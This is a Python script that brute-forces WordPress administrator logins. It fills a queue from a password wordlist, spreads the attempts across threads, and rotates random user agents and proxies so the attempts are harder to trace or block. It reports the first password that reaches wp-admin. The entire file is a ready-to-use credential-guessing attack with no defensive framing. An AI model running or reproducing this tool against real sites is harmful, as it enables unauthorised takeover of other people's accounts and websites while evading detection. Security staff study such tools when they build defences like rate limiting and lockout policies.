import requests
from bs4 import BeautifulSoup
from queue import Queue
import threading
import random
from utils import get

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def get_random_proxy():
    return random.choice(PROXIES)

def login_wordpress(url, username, password):
    login_url = url + '/wp-login.php'
    session = requests.Session()

    headers = {
        "User-Agent": get_random_user_agent()
    }

    session.headers.update(headers)

    proxy = get_random_proxy()

    response = session.get(login_url, proxies={'http': proxy, 'https': proxy})
    soup = BeautifulSoup(response.content, 'html.parser')
    wp_nonce_field = soup.find('input', attrs={'name': 'log'})
    
    login_data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'testcookie': '1'
    }
    
    if wp_nonce_field:
        login_data[wp_nonce_field.get('name')] = wp_nonce_field.get('value')
    
    response = session.post(login_url, data=login_data)
    return 'wp-admin' in response.url

def worker(url, username, passwords_queue, found_password):
    url = url
    while not passwords_queue.empty() and not found_password[0]:
        password = passwords_queue.get()
        if login_wordpress(url, username, password):
            print(f'Successfully logged into WordPress with password: {password}')
            found_password[0] = password

def load_passwords_from_file(filename):
    with open(filename, 'r') as f:
        return [line.strip() for line in f.readlines()]

def start_bruteforce(url, username, passwords, num_threads=10):
    passwords_queue = Queue()
    for password in passwords:
        passwords_queue.put(password)

    found_password = [None]

    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=worker, args=(url, username, passwords_queue, found_password))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    return found_password[0]

def main(url, username, password_list = "core/config/word_lists/test.txt"):
    global USER_AGENTS 
    USER_AGENTS = get.user_agents()
    global PROXIES 
    PROXIES = get.proxies("proxies")
    passwords = load_passwords_from_file(password_list)
    result = start_bruteforce(url, username, passwords)

    if result:
        return result
    else:
        return None
